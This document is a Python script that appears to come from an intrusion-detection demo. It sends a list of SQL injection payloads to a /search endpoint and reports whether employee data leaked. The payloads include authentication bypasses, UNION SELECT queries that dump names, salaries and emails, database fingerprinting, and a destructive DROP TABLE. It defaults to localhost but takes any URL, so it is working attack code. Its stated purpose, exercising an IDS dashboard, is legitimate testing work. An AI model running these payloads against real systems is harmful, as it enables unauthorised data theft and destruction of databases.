"""
SQL Injection Attack Script
===========================
Fires a series of classic SQLi payloads at the /search endpoint.
Watch the IDS dashboard catch every single one!

Usage:
    python attack_scripts/sqli_attack.py
    python attack_scripts/sqli_attack.py --url http://localhost:5001 --delay 1.0
"""

import argparse
import time
import requests

# ── Classic SQLi payloads ──────────────────────────────────────────────────────
PAYLOADS = [
    # Basic auth bypass
    ("' OR '1'='1",                      "Auth bypass — always-true condition"),
    ("' OR '1'='1' --",                  "Auth bypass with comment to ignore rest"),
    ("' OR 1=1 --",                      "Numeric always-true with comment"),
    ("admin' --",                        "Username bypass — comment out password check"),

    # UNION-based data extraction
    ("' UNION SELECT 1,name,department,salary,email FROM employees --",
                                         "UNION SELECT — dump all employee data"),
    ("' UNION SELECT 1,name,email,salary,department FROM employees WHERE salary > 100000 --",
                                         "UNION SELECT — high earners only"),

    # Boolean / error probing
    ("' AND 1=1 --",                     "Boolean TRUE — page should show results"),
    ("' AND 1=2 --",                     "Boolean FALSE — page should show nothing"),
    ("'; DROP TABLE employees; --",      "DROP TABLE (destructive payload)"),

    # Information gathering
    ("' UNION SELECT 1,sqlite_version(),3,4,5 --",
                                         "Fingerprint DB version via UNION"),
    ("' OR name LIKE '%admin%' --",      "Wildcard search for admin accounts"),
    ("' OR email LIKE '%@corp%' --",     "Extract all corporate email addresses"),
]

def run(base_url: str, delay: float):
    search_url = base_url.rstrip("/") + "/search"

    print("\n" + "═" * 65)
    print("  💉 SQL INJECTION ATTACK  →  " + search_url)
    print("═" * 65)
    print(f"  Payloads: {len(PAYLOADS)}  |  Delay: {delay}s between attempts\n")

    for i, (payload, description) in enumerate(PAYLOADS, 1):
        print(f"[{i:02d}/{len(PAYLOADS)}] {description}")
        print(f"         Payload: {payload}")

        try:
            t0 = time.perf_counter()
            resp = requests.get(search_url, params={"q": payload}, timeout=5)
            ms   = (time.perf_counter() - t0) * 1000

            body = resp.text

            # Check if data was leaked
            if "alice@corp" in body.lower() or "frank" in body.lower():
                status = "💀 DATA LEAKED"
            elif "error" in body.lower() and "sql" in body.lower():
                status = "⚠️  SQL ERROR (DB fingerprinted)"
            elif "1 record" in body or "record(s)" in body:
                status = "⚠️  RECORDS RETURNED"
            elif resp.status_code == 200 and "No employees" not in body:
                status = "⚠️  UNEXPECTED RESPONSE"
            else:
                status = "✓  No data returned"

            print(f"         Result: {status}  [{resp.status_code}]  ({ms:.0f} ms)")

        except requests.ConnectionError:
            print("         Result: ❌ Connection refused — is the server running?")
        except Exception as e:
            print(f"         Result: ❌ Error — {e}")

        print()
        time.sleep(delay)

    print("═" * 65)
    print("  ✅ Attack sequence complete!")
    print("  👀 Check the IDS dashboard — all payloads should be flagged.")
    print("═" * 65 + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection attack demo")
    parser.add_argument("--url",   default="http://localhost:5001",
                        help="Base URL of target server (default: http://localhost:5001)")
    parser.add_argument("--delay", type=float, default=0.8,
                        help="Seconds between payloads (default: 0.8)")
    args = parser.parse_args()
    run(args.url, args.delay)
